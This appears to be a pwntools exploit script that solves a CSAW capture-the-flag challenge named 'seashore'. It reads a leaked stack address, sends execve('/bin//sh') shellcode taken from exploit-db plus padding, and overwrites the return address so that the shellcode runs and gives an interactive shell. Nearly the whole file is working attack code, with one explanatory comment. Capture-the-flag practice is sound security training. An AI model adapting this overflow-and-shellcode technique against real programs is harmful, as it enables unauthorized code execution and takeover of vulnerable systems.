#!/usr/bin/env python3
from pwn import *

# p = remote('pwn.chal.csaw.io', 1003)
p = process('./seashore')

p.recvuntil(': ')
buffer_address = int(p.recv(), 16)
print('Buffer address: ' + hex(buffer_address))

# from https://www.exploit-db.com/exploits/36858/
shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
payload = shellcode + b'A' * 17 + p64(buffer_address) # Put buffer address as main()'s return address to execute shell code.
p.sendline(payload)

p.interactive()
p.close()
